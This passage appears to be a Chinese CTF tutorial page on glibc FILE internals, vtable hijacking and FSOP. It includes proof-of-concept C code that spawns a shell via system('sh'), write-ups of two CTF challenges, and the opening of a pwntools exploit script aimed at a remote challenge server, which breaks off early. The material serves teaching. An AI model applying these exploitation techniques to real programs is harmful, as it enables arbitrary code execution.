+</code></pre></div>
+<p>之后会为创建的 FILE 初始化 vtable，并调用_IO_file_init 进一步初始化操作</p>
+<div class="highlight"><pre><span></span><code><span class="n">_IO_JUMPS</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">new_f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_file_jumps</span><span class="p">;</span>
+<span class="n">_IO_file_init</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">new_f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">);</span>
+</code></pre></div>
+<p>在_IO_file_init 函数的初始化操作中，会调用_IO_link_in 把新分配的 FILE 链入_IO_list_all 为起始的 FILE 链表中</p>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span>
+<span class="nf">_IO_link_in</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span>
+     <span class="k">struct</span> <span class="nc">_IO_FILE_plus</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">.</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_LINKED</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">.</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_LINKED</span><span class="p">;</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">.</span><span class="n">_chain</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">_IO_list_all</span><span class="p">;</span>
+      <span class="n">_IO_list_all</span> <span class="o">=</span> <span class="n">fp</span><span class="p">;</span>
+      <span class="o">++</span><span class="n">_IO_list_all_stamp</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>之后__fopen_internal 函数会调用_IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数，这里不再深入。</p>
+<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="n">_IO_file_fopen</span> <span class="p">((</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">new_f</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">is32</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">__fopen_maybe_mmap</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">new_f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">.</span><span class="n">file</span><span class="p">);</span>
+</code></pre></div>
+<p>总结一下 fopen 的操作是</p>
+<ul>
+<li>使用 malloc 分配 FILE 结构</li>
+<li>设置 FILE 结构的 vtable</li>
+<li>初始化分配的 FILE 结构</li>
+<li>将初始化的 FILE 结构链入 FILE 结构链表中</li>
+<li>调用系统调用打开文件</li>
+</ul>
+<h3 id="fclose">fclose<a class="headerlink" href="#fclose" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>涉及源码文件：</p>
+<div class="highlight"><pre><span></span><code><span class="n">libio</span><span class="o">/</span><span class="n">iofclose</span><span class="p">.</span><span class="n">c</span>
+</code></pre></div>
+</blockquote>
+<p>fclose 是标准 IO 库中用于关闭已打开文件的函数，其作用与 fopen 相反。</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="n">fclose</span><span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">)</span>
+</code></pre></div>
+<p>功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p>
+<p>fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链</p>
+<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_file_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_FILEBUF</span><span class="p">)</span>
+    <span class="n">_IO_un_link</span> <span class="p">((</span><span class="k">struct</span> <span class="nc">_IO_FILE_plus</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">);</span>
+</code></pre></div>
+<p>之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件</p>
+<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_file_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_FILEBUF</span><span class="p">)</span>
+    <span class="n">status</span> <span class="o">=</span> <span class="n">_IO_file_close_it</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</code></pre></div>
+<p>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构</p>
+<div class="highlight"><pre><span></span><code><span class="n">_IO_FINISH</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</code></pre></div>
+<h3 id="printfputs">printf/puts<a class="headerlink" href="#printfputs" title="Permanent link">&para;</a></h3>
+<p>printf 和 puts 是常用的输出函数，在 printf 的参数是以'\n'结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p>
+<p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会**调用 vtable 中的_IO_sputn**，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p>
+<p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p>
+<div class="highlight"><pre><span></span><code><span class="n">vfprintf</span><span class="o">+</span><span class="mi">11</span>
+<span class="n">_IO_file_xsputn</span>
+<span class="n">_IO_file_overflow</span>
+<span class="n">funlockfile</span>
+<span class="n">_IO_file_write</span>
+<span class="n">write</span>
+</code></pre></div>
+<h2 id="vtable">伪造 vtable 劫持程序流程<a class="headerlink" href="#vtable" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><libc 2.23 --> 修改 vtable 中某些函数的指针</p>
+<p>>=libc 2.23 &rarr; 通过伪造 vtable 结构体来调用某些函数的指针</p>
+</blockquote>
+<h3 id="_3">简介<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>IO 操作函数需要经过 FILE 结构进行处理。尤其是 _IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。</p>
+<p>因此伪造 vtable 劫持程序流程的中心思想就是**针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。**</p>
+<p><strong>vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。</strong></p>
+<h3 id="_4">原理示例<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>修改 vtable 中的指针，</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+    <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">vtable_ptr</span><span class="p">;</span>
+    <span class="n">fp</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="s">&quot;123.txt&quot;</span><span class="p">,</span><span class="s">&quot;rw&quot;</span><span class="p">);</span>
+    <span class="n">vtable_ptr</span><span class="o">=*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="o">*</span><span class="p">)((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">fp</span><span class="o">+</span><span class="mh">0xd8</span><span class="p">);</span>     <span class="c1">//get vtable</span>
+    <span class="n">vtable_ptr</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="o">=</span><span class="mh">0x41414141</span> <span class="c1">//xsputn</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;call 0x41414141&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>根据 vtable 在 _IO_FILE_plus 的偏移得到 vtable 的地址，在 64 位系统下偏移是 0xd8。之后搞清楚劫持的 IO 函数会调用 vtable 中的哪个虚函数。vtable 函数进行调用时，传入的第一个参数其实是对应的 _IO_FILE_plus 地址。比如调用 printf ，传递给 vtable 的第一个参数是 _IO_2_1_stdout_ 的地址。利用这点可以实现给劫持的 vtable 函数传參，比如</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#define system_ptr 0x7ffff7a52390;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+    <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">vtable_ptr</span><span class="p">;</span>
+    <span class="n">fp</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="s">&quot;123.txt&quot;</span><span class="p">,</span><span class="s">&quot;rw&quot;</span><span class="p">);</span>
+    <span class="n">vtable_ptr</span><span class="o">=*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="o">*</span><span class="p">)((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">fp</span><span class="o">+</span><span class="mh">0xd8</span><span class="p">);</span>     <span class="c1">//get vtable</span>
+
+    <span class="n">memcopy</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span><span class="s">&quot;sh&quot;</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
+
+    <span class="n">vtable_ptr</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="o">=</span><span class="n">system_ptr</span> <span class="c1">//xsputn</span>
+
+
+    <span class="n">fwrite</span><span class="p">(</span><span class="s">&quot;hi&quot;</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">fp</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>但是在目前 <strong>libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的</strong>。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用。</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#define system_ptr 0x7ffff7a52390;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+    <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">vtable_addr</span><span class="p">,</span><span class="o">*</span><span class="n">fake_vtable</span><span class="p">;</span>
+
+    <span class="n">fp</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="s">&quot;123.txt&quot;</span><span class="p">,</span><span class="s">&quot;rw&quot;</span><span class="p">);</span>
+    <span class="n">fake_vtable</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">);</span>
+
+    <span class="n">vtable_addr</span><span class="o">=</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">fp</span><span class="o">+</span><span class="mh">0xd8</span><span class="p">);</span>     <span class="c1">//vtable offset</span>
+
+    <span class="n">vtable_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">fake_vtable</span><span class="p">;</span>
+
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span><span class="s">&quot;sh&quot;</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
+
+    <span class="n">fake_vtable</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="o">=</span><span class="n">system_ptr</span><span class="p">;</span> <span class="c1">//xsputn</span>
+
+    <span class="n">fwrite</span><span class="p">(</span><span class="s">&quot;hi&quot;</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">fp</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>我们首先分配一款内存来存放**伪造的 vtable，之后修改 _IO_FILE_plus 的 vtable 指针指向这块内存**。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 "/bin/sh" 或 "sh"。</p>
+<p><strong>因为 vtable 中的函数调用时会把对应的 _IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 "sh" 写入 _IO_FILE_plus 头部</strong>。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system("sh")。</p>
+<p>同样，如果程序中不存在 fopen 等函数创建的 _IO_FILE 时，也可以选择 stdin\stdout\stderr 等位于 libc.so 中的 _IO_FILE ，这些流在 printf\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。</p>
+<div class="highlight"><pre><span></span><code>print &amp;_IO_2_1_stdin_
+$2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;
+
+0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
+</code></pre></div>
+<h3 id="_5">小结<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<ul>
+<li>vtable 劫持分为两种：</li>
+<li>直接改写 vtable 中的虚函数指针</li>
+<li>覆盖 vtable 的指针（伪造 vtabel）</li>
+<li>libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入</li>
+<li>vtable 中的函数调用时会把对应的 _IO_FILE_plus 指针作为第一个参数传递，可以将 sh 或其他参数写入 _IO_FILE_plus 头部</li>
+</ul>
+<h3 id="_6">例题<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<h4 id="2018-hctf-the_end">2018 HCTF the_end<a class="headerlink" href="#2018-hctf-the_end" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end/">题目链接</a></p>
+<p>通过伪造 vtabel 实现运行特定函数（修改虚函数的 overflow 指针）</p>
+<p>其他做法：<a href="https://blog.csdn.net/Mira_Hu/article/details/103736917">https://blog.csdn.net/Mira_Hu/article/details/103736917</a></p>
+</blockquote>
+<h5 id="_7">基本情况<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h5>
+<p>除了 canary 保护全开，任意地址写 5 字节</p>
+<h5 id="_8">思路<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h5>
+<p>在程序调用 exit 后，会遍历 <em>IO_list_all ，调用 _IO_2_1_stdout</em> 下的 vatable 中 _setbuf 函数。先修改两个字节在当前 vtable 附近伪造一个 fake_vtable ，然后使用 3 个字节修改 fake_vtable 中 _setbuf 的内容为 one_gadget 。</p>
+<h2 id="fsop">FSOP<a class="headerlink" href="#fsop" title="Permanent link">&para;</a></h2>
+<h3 id="_9">介绍<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<p>进程内所有的 _IO_FILE 结构会使用 _chain 域相互连接形成一个链表，这个链表的头部由 _IO_list_all 维护。</p>
+<p>FSOP 的核心思想就是劫持 _IO_list_all 的值来伪造链表和其中的 _IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用 _IO_flush_all_lockp，这个函数会刷新 _IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用 _IO_FILE_plus.vtable 中的 _IO_overflow。</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span>
+<span class="nf">_IO_flush_all_lockp</span> <span class="p">(</span><span class="kt">int</span> <span class="n">do_lock</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="p">...</span>
+  <span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">_IO_list_all</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+  <span class="p">{</span>
+       <span class="p">...</span>
+       <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span>
+               <span class="o">&amp;&amp;</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
+           <span class="p">{</span>
+               <span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
+          <span class="p">}</span>
+        <span class="p">...</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p><img alt="img" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210172118.jpeg" /></p>
+<p>而 _IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p>
+<ol>
+<li>
+<p>当 libc 执行 abort 流程时</p>
+</li>
+<li>
+<p>当执行 exit 函数时</p>
+</li>
+</ol>
+<p><img alt="image-20201208195441734" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210172159.png" /></p>
+<ol>
+<li>当执行流从 main 函数返回时</li>
+</ol>
+<h3 id="_10">原理示例<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<p>FSOP 利用的条件：泄露 libc.so 基址，因为 _IO_list_all 是作为全局变量储存在 libc.so 中的；用任意地址写把 _IO_list_all 改为指向可控内存的地址；伪造 _IO_FILE_plus 结构体。伪造结构体需要 bypass 这些 check ：</p>
+<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span>
+               <span class="o">&amp;&amp;</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
+           <span class="p">{</span>
+               <span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
+          <span class="p">}</span>
+</code></pre></div>
+<p>也就是</p>
+<ul>
+<li><strong>fp-&gt;_mode &lt;= 0</strong></li>
+<li><strong>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</strong></li>
+</ul>
+<p>写一个 demo 验证一下：首先分配一块内存用于存放伪造 _IO_FILE_plus（_IO_FILE、vtable)。_IO_write_ptr、_IO_write_base、_mode 等数据偏移如下（可以通过查前面给出结构体算出来）：</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#define _IO_list_all 0x7ffff7dd2520</span>
+<span class="cp">#define writebase_offset 0x20</span>
+<span class="cp">#define writeptr_offset 0x28</span>
+<span class="cp">#define mode_offset 0xc0</span>
+<span class="cp">#define vtable_offset 0xd8</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+    <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">list_all_ptr</span><span class="p">;</span>
+    <span class="n">ptr</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">);</span>
+        <span class="c1">//bypass</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="o">*</span><span class="p">)((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">ptr</span><span class="o">+</span><span class="n">mode_offset</span><span class="p">)</span><span class="o">=</span><span class="mh">0x0</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="o">*</span><span class="p">)((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">ptr</span><span class="o">+</span><span class="n">writeptr_offset</span><span class="p">)</span><span class="o">=</span><span class="mh">0x1</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="o">*</span><span class="p">)((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">ptr</span><span class="o">+</span><span class="n">writebase_offset</span><span class="p">)</span><span class="o">=</span><span class="mh">0x0</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="o">*</span><span class="p">)((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">ptr</span><span class="o">+</span><span class="n">vtable_offset</span><span class="p">)</span><span class="o">=</span><span class="p">((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">ptr</span><span class="o">+</span><span class="mh">0x100</span><span class="p">);</span>
+        <span class="c1">//vtable _IO_overflow</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="o">*</span><span class="p">)((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">ptr</span><span class="o">+</span><span class="mh">0x100</span><span class="o">+</span><span class="mi">24</span><span class="p">)</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
+        <span class="c1">//orw _IO_list_all _chain 2 fake _IO_FILE_plus</span>
+    <span class="n">list_all_ptr</span><span class="o">=</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">_IO_list_all</span><span class="p">;</span>
+    <span class="n">list_all_ptr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="n">ptr</span><span class="p">;</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>前 0x100 个字节作为 _IO_FILE ，后 0x100 个字节作为 vtable ，在 vtable _IO_overflow 指针劫持为 0x41414141 。</p>
+<p>之后，覆盖 libc 中的全局变量 _IO_list_all 指向伪造的 _IO_FILE_plus 。</p>
+<blockquote>
+<p>全局变量 _IO_list_all 存储着结构体 _IO_FILE_plus 的地址，这个地址也是 _IO_FILE 所在地址，后面是 vtable </p>
+</blockquote>
+<p>通过调用 exit 函数，程序会执行 _IO_flush_all_lockp，经过 fflush<sup id="fnref:1"><a class="footnote-ref" href="#fn:1">1</a></sup> 获取 _IO_list_all 的值并取出作为 _IO_FILE_plus **调用其中的 _IO_overflow 函数**实现功能：</p>
+<div class="highlight"><pre><span></span><code>---&gt; call _IO_overflow
+[#0] 0x7ffff7a89193 → Name: _IO_flush_all_lockp(do_lock=0x0)
+[#1] 0x7ffff7a8932a → Name: _IO_cleanup()
+[#2] 0x7ffff7a46f9b → Name: __run_exit_handlers(status=0x0, listp=&lt;optimized out&gt;, run_list_atexit=0x1)
+[#3] 0x7ffff7a47045 → Name: __GI_exit(status=&lt;optimized out&gt;)
+[#4] 0x4005ce → Name: main()
+</code></pre></div>
+<h3 id="_11">例题<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<h4 id="ciscn_2019_n_7">ciscn_2019_n_7<a class="headerlink" href="#ciscn_2019_n_7" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>大体是用 FSOP 思路，不是劫持 _IO_list_all _chain 指针伪造一个结构体；而直接修改 _IO_FILE_plus </p>
+</blockquote>
+<h4 id="_12">基本情况<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h4>
+<p>保护全开，用的是 buu 的远程环境对应是 Ubuntu 16 libc 2.23：</p>
+<p><div class="highlight"><pre><span></span><code>Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled
+FORTIFY:  Enable
+</code></pre></div>
+程序只能有一个堆，用结构体维护，结构如下：</p>
+<div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="p">{</span>
+  <span class="n">size</span><span class="p">;</span><span class="c1">//8bit</span>
+  <span class="n">data</span><span class="p">;</span><span class="c1">//8bit</span>
+  <span class="n">chunk_addr</span><span class="p">;</span><span class="c1">//8bit  </span>
+<span class="p">}</span>
+</code></pre></div>
+<h4 id="_13">漏洞<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h4>
+<p>在 add 时写入 author 时溢出 8 bit 刚好可以覆盖堆指针：</p>
+<p><img alt="image-20201210201615356" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210201615.png" /></p>
+<p>结合 edit 可以多次修改堆指针，实现任意地址多次写入：</p>
+<p><img alt="image-20201210201739661" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210201739.png" /></p>
+<h4 id="_14">思路<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h4>
+<p>myexit 函数有关闭 stdout、stderr 后执行 exit() ，exit() 时系统会调用 _IO_flush_all_lockp 。修改堆指针到 _IO_2_1_stderr_ ，布置绕过绕过需要的数据；在适当位置写入 system ，将 vtable 劫持到这个空间上，完成劫持 _IO_flush_all_lockp 为 system 。写入 _IO_2_1_stderr_ 时将 /bin/sh 写到 _IO_FILE 的头部，调用虚函数时 _IO_FILE 是第一个参数。</p>
+<blockquote>
+<p>因为 vtable 中的函数调用时会把对应的 _IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 "sh" 写入 _IO_FILE_plus 头部。</p>
+</blockquote>
+<p><strong>调试查看结构体</strong>：</p>
+<div class="highlight"><pre><span></span><code>p *<span class="o">((</span>struct <span class="o">[</span>结构体类型<span class="o">]</span>*<span class="o">)[</span>地址<span class="o">])</span>
+</code></pre></div>
+<h4 id="exp">EXP<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span><span class="c1">#,terminal=[&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;])</span>
+
+<span class="c1">#p = process(&quot;./ciscn_2019_n_7&quot;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;node3.buuoj.cn&quot;</span><span class="p">,</span><span class="mi">28957</span><span class="p">)</span>
+<span class="c1">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./ciscn_2019_n_7&quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">command</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;-&gt; </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">command</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;New Author name:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;New contents:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="n">command</span><span class="p">(</span><span class="mi">666</span><span class="p">)</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
